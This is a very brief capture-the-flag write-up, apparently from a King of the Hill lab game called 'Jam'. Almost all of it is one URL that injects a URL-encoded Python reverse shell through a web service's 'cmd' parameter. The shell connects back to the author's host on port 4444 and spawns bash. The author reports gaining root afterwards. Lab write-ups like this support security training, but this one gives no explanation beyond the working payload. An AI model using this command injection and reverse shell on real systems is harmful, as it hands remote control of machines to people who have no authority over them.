# KOTH - Jam

I went to the following link and I imported my reverse shell 
```
http://10.10.229.226:3000/?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.8.113.186%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27
```

and after that I was root that was very simple
